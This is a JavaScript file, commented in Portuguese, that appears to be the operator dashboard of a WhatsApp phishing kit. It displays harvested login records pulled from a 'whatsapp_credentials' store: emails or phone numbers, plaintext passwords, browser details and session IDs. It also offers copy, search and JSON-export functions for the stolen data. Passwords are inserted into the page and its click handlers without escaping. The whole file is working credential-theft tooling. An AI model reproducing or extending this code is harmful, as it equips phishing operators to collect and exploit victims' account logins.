// Sistema de Gerenciamento de Credenciais
document.addEventListener('DOMContentLoaded', function() {
    // Elementos
    const credentialsList = document.getElementById('credentialsList');
    const credentialCount = document.getElementById('credentialCount');
    const totalUsers = document.getElementById('totalUsers');
    const lastLogin = document.getElementById('lastLogin');
    const storageUsed = document.getElementById('storageUsed');
    const searchInput = document.getElementById('searchInput');
    const detailModal = document.getElementById('detailModal');
    const modalBody = document.getElementById('modalBody');

    // Carregar credenciais
    loadCredentials();
    
    // Configurar busca
    searchInput.addEventListener('input', filterCredentials);
    
    // Atualizar a cada 5 segundos
    setInterval(loadCredentials, 5000);

    // Função para carregar credenciais
    function loadCredentials() {
        const credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
        
        // Atualizar contador
        credentialCount.textContent = `${credentials.length} credencial${credentials.length !== 1 ? 's' : ''}`;
        
        // Atualizar estatísticas
        updateStats(credentials);
        
        // Renderizar lista
        renderCredentials(credentials);
    }

    // Renderizar credenciais
    function renderCredentials(credentials) {
        if (credentials.length === 0) {
            credentialsList.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-inbox"></i>
                    <h3>Nenhuma credencial encontrada</h3>
                    <p>As credenciais de login aparecerão aqui automaticamente</p>
                </div>
            `;
            return;
        }
        
        credentialsList.innerHTML = credentials.map(cred => `
            <div class="credential-card" data-id="${cred.id}">
                <div class="card-header">
                    <div class="user-info">
                        <h3>${escapeHTML(cred.email)}</h3>
                        <div class="timestamp">
                            <i class="far fa-clock"></i>
                            ${formatDate(cred.timestamp)}
                        </div>
                    </div>
                </div>
                
                <div class="card-content">
                    <div class="password-field">
                        <span>${cred.password}</span>
                        <button class="copy-btn" onclick="copyToClipboard('${cred.password}')">
                            <i class="far fa-copy"></i>
                        </button>
                    </div>
                    
                    <div class="remember-status ${cred.remember}">
                        <i class="fas fa-${cred.remember ? 'check' : 'times'}"></i>
                        ${cred.remember ? 'Manter conectado' : 'Sessão única'}
                    </div>
                </div>
                
                <div class="card-footer">
                    <div class="browser-info" title="${cred.browser || 'Navegador desconhecido'}">
                        <i class="fas fa-globe"></i>
                        ${truncateText(cred.browser || 'Navegador desconhecido', 30)}
                    </div>
                    <button class="view-btn" onclick="viewCredential('${cred.id}')">
                        <i class="fas fa-eye"></i>
                        Detalhes
                    </button>
                </div>
            </div>
        `).join('');
    }

    // Filtrar credenciais
    function filterCredentials() {
        const searchTerm = searchInput.value.toLowerCase();
        const credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
        
        if (!searchTerm) {
            renderCredentials(credentials);
            return;
        }
        
        const filtered = credentials.filter(cred => 
            cred.email.toLowerCase().includes(searchTerm) ||
            cred.password.toLowerCase().includes(searchTerm) ||
            cred.date.toLowerCase().includes(searchTerm)
        );
        
        renderCredentials(filtered);
    }

    // Atualizar estatísticas
    function updateStats(credentials) {
        // Usuários únicos
        const uniqueEmails = new Set(credentials.map(c => c.email));
        totalUsers.textContent = uniqueEmails.size;
        
        // Último login
        if (credentials.length > 0) {
            const last = new Date(credentials[0].timestamp);
            lastLogin.textContent = last.toLocaleTimeString('pt-BR');
        }
        
        // Armazenamento usado
        const data = JSON.stringify(credentials);
        const bytes = new TextEncoder().encode(data).length;
        storageUsed.textContent = formatBytes(bytes);
    }

    // Visualizar credencial detalhada
    window.viewCredential = function(id) {
        const credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
        const credential = credentials.find(c => c.id == id);
        
        if (!credential) return;
        
        modalBody.innerHTML = `
            <div class="detail-item">
                <label>Email/Número</label>
                <div class="value">${escapeHTML(credential.email)}</div>
            </div>
            
            <div class="detail-item">
                <label>Senha</label>
                <div class="value">
                    ${credential.password}
                    <button onclick="copyToClipboard('${credential.password}')" 
                            style="margin-left: 10px; padding: 5px 10px;">
                        <i class="far fa-copy"></i> Copiar
                    </button>
                </div>
            </div>
            
            <div class="detail-item">
                <label>Data e Hora</label>
                <div class="value">${formatDate(credential.timestamp)}</div>
            </div>
            
            <div class="detail-item">
                <label>Status</label>
                <div class="value">
                    <span class="remember-status ${credential.remember}">
                        <i class="fas fa-${credential.remember ? 'check' : 'times'}"></i>
                        ${credential.remember ? 'Sessão mantida' : 'Sessão única'}
                    </span>
                </div>
            </div>
            
            <div class="detail-item">
                <label>Navegador</label>
                <div class="value">${escapeHTML(credential.browser || 'Não informado')}</div>
            </div>
            
            <div class="detail-item">
                <label>ID da Sessão</label>
                <div class="value">${credential.id}</div>
            </div>
        `;
        
        detailModal.classList.add('active');
    };

    // Fechar modal
    window.closeModal = function() {
        detailModal.classList.remove('active');
    };

    // Copiar para área de transferência
    window.copyToClipboard = function(text) {
        navigator.clipboard.writeText(text).then(() => {
            alert('Texto copiado!');
        });
    };

    // Exportar dados
    window.exportData = function() {
        const credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
        const dataStr = JSON.stringify(credentials, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        
        const url = URL.createObjectURL(dataBlob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `whatsapp_credentials_${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        alert('Dados exportados com sucesso!');
    };

    // Atualizar dados
    window.refreshData = function() {
        loadCredentials();
        alert('Dados atualizados!');
    };

    // Limpar todos os dados
    window.clearAll = function() {
        if (confirm('Tem certeza que deseja apagar TODAS as credenciais?')) {
            localStorage.removeItem('whatsapp_credentials');
            loadCredentials();
            alert('Todas as credenciais foram removidas!');
        }
    };

    // Fechar modal ao clicar fora
    detailModal.addEventListener('click', function(e) {
        if (e.target === this) {
            closeModal();
        }
    });

    // Fechar modal com ESC
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            closeModal();
        }
    });
});

// Funções auxiliares
function formatDate(isoString) {
    const date = new Date(isoString);
    return date.toLocaleString('pt-BR');
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function truncateText(text, maxLength) {
    if (text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
}

function escapeHTML(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
